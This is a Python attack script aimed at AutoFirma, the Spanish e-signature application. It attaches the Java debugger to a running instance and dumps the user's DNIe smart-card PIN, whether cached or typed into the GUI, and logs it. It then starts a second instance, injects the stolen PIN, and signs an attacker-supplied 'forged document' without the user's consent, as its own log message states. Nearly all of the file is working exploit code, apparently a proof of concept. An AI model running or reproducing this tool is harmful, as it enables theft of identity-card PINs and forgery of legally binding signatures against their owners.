#!/usr/bin/python3
# -*- encoding: utf-8 -*-

import argparse
import logging
import signal
import subprocess
import sys
import threading
import time
import os

# Global variables
COMMAND_JDB = "jdb -attach localhost:{port}"
COMMAND_AUTOFIRMA = "java -agentlib:jdwp=transport=dt_socket,address={port},server=y,suspend=n -jar /usr/lib/AutoFirma/AutoFirma.jar sign -i {input} -o {output} -format auto -store dni -alias CertFirmaDigital"
stop_threads = False
parent_proc = None


def keep_alive(proc):
    while True:
        if stop_threads:
            break
        status = proc.poll()
        if status != None:
            if b'Connection refused' in proc.stderr.readline():
                logging.fatal(
                    'AutoFirma process not found, unable to attach debugger')
                os._exit(1)
            logging.fatal(
                'AutoFirma process was closed by the user')
            os._exit(1)


def run(proc):
    proc.stdin.write('run\n'.encode())
    proc.stdin.flush()


def get_gui_password(proc):
    proc.stdin.write(
        'stop in es.gob.jmulticard.ui.passwordcallback.gui.PasswordResult.getPassword\n'.encode())
    proc.stdin.flush()
    proc.stdin.write('monitor dump this.password\n'.encode())
    proc.stdin.flush()
    for line in iter(proc.stdout.readline, ''):
        if b'this.password = {' in line:
            raw_password = proc.stdout.readline()
            password = raw_password.decode().replace(', ', '').strip()
            run(proc)
            proc.stdin.write('unmonitor 1\n'.encode())
            proc.stdin.flush()
            proc.stdin.write(
                'clear es.gob.jmulticard.ui.passwordcallback.gui.PasswordResult.getPassword\n'.encode())
            proc.stdin.flush()
            return password


def get_cached_password(proc):
    proc.stdin.write(
        'stop in es.gob.jmulticard.ui.passwordcallback.gui.DnieCacheCallbackHandler.handle\n'.encode())
    proc.stdin.flush()
    proc.stdin.write('monitor dump this.cachedPassword\n'.encode())
    proc.stdin.flush()
    password = None
    for line in iter(proc.stdout.readline, ''):
        if b'this.cachedPassword =' in line:
            logging.info('Attempting to recover cached password')
            if b'null' in line:
                break
            raw_password = proc.stdout.readline()
            password = raw_password.decode().replace(', ', '').strip()
            break
    run(proc)
    proc.stdin.write('unmonitor 1\n'.encode())
    proc.stdin.flush()
    proc.stdin.write(
        'clear es.gob.jmulticard.ui.passwordcallback.gui.DnieCacheCallbackHandler.handle\n'.encode())
    proc.stdin.flush()
    return password


def get_password(proc):
    password = get_cached_password(proc)
    if password == None:
        logging.info('Password not cached, showing UI panel to the user')
        password = get_gui_password(proc)
    logging.info(f'PIN found: {password}')
    return password


def wait_for_sign(proc):
    logging.info('Waiting for the legitimate sign operation to finish')
    proc.stdin.write(
        'stop in es.gob.afirma.standalone.ui.SignPanelSignTask.pluginsPostProcess\n'.encode())
    proc.stdin.flush()
    for line in iter(proc.stdout.readline, ''):
        if b'Breakpoint hit' in line:
            logging.info('Legitimate sign finished')
            proc.stdin.write(
                'clear es.gob.afirma.standalone.ui.SignPanelSignTask.pluginsPostProcess\n'.encode())
            proc.stdin.flush()
            return


def sign_document(pin, input, output):
    logging.info('Attempting to sign the forged document')
    debugger_port = 8001
    autofirma_proc = subprocess.Popen(COMMAND_AUTOFIRMA.format(port=debugger_port, input=input, output=output).split(' '),
                                      stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE)
    jdb_proc = subprocess.Popen(COMMAND_JDB.format(port=debugger_port).split(' '),
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
    jdb_proc.stdin.write(
        'stop in es.gob.jmulticard.ui.passwordcallback.gui.DnieCacheCallbackHandler.handle\n'.encode())
    jdb_proc.stdin.flush()
    jdb_proc.stdin.write(
        f'monitor set this.cachedPassword = "{pin}".toCharArray()\n'.encode())
    jdb_proc.stdin.flush()
    logging.info('Debugger configured for new AutoFirma instance')
    for line in iter(jdb_proc.stdout.readline, ''):
        if b'this.cachedPassword =' in line:
            run(jdb_proc)
            break
    autofirma_proc.wait()


def cleanup():
    global stop_threads
    stop_threads = True
    parent_proc.stdin.close()
    parent_proc.terminate()
    parent_proc.wait(timeout=1)


def sig_handler(sig, frame):
    logging.info('User sent the shutdown signal, wrapping up')
    cleanup()
    sys.exit(0)


if __name__ == '__main__':
    signal.signal(signal.SIGINT, sig_handler)

    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--input", help="input file to sign")
    parser.add_argument("-w", "--output", help="output file signed")
    args = parser.parse_args()
    if (args.input and not args.output) or (args.output and not args.input):
        print(
            "Both an input document and an output filename must be provided to the script")
        parser.print_help()
        sys.exit(1)

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=[logging.StreamHandler(sys.stdout)]
    )
    parent_proc = subprocess.Popen(COMMAND_JDB.format(port=8000).split(' '),
                                   stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
    keep_alive_thread = threading.Thread(
        target=keep_alive, args=(parent_proc,))
    keep_alive_thread.daemon = True
    keep_alive_thread.start()

    logging.info('Password collector enabled')
    while True:
        pin = get_password(parent_proc)
        if args.input:
            break
    wait_for_sign(parent_proc)
    sign_document(pin, args.input, args.output)
    run(parent_proc)
    logging.info("Done! File was signed without the user's consent")

    cleanup()
    sys.exit(0)
